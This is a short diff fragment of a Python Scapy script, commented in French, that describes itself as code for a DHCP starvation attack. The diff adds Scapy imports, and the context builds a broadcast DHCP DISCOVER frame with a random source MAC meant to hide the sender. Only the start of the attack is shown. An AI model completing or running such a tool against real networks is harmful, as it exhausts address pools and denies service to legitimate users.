@@ -2,6 +2,11 @@
 '''Code source pour l'attaque DHCP Starvation'''
 #Importation de toutes les fonctionnalités de la bibliothèque scapy
 from scapy.all import *
+from scapy.layers.dhcp import BOOTP, DHCP
+from scapy.layers.inet import *
+from scapy.layers.l2 import Ether
+
+
 #Construction d'un paquet DHCP_DISCOVER à envoyer
 #Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
 frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
